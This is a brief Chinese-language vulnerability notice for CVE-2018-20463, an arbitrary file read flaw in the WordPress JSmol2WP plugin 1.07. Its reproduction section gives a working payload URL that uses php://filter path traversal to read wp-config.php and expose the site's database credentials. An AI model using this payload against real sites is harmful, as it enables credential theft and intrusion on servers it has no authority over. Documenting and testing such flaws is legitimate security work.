# ( CVE-2018-20463) WordPress JSmol2WP Plugin 安全漏洞

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzkyMjE3MjEyNQ==&mid=2247485902&idx=1&sn=442618160dc374e227cc41c8aed62474&chksm=c1f9267cf68eaf6ac50f2b617e4f24b09ce183efcbf15bdeeed5e9a0f7b450ae607d267ef466&scene=126&sessionid=1681659559#rd](http://mp.weixin.qq.com/s?__biz=MzkyMjE3MjEyNQ==&mid=2247485902&idx=1&sn=442618160dc374e227cc41c8aed62474&chksm=c1f9267cf68eaf6ac50f2b617e4f24b09ce183efcbf15bdeeed5e9a0f7b450ae607d267ef466&scene=126&sessionid=1681659559#rd)

01

漏洞简介

  

     WordPress是WordPress软件基金会的一套使用PHP语言开发的博客平台，该平台支持在PHP和MySQL的服务器上架设个人博客网站。JSmol2WP Plugin是使用在其中的一个支持查看3D化学结构的插件。  
    WordPress JSmol2WP Plugin 1.07版本中存在安全漏洞。攻击者可利用该漏洞读取任意文件。

  

02

影响范围

  

WordPress JSmol2WP Plugin 1.07

  

03

漏洞复现

  

payload:/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
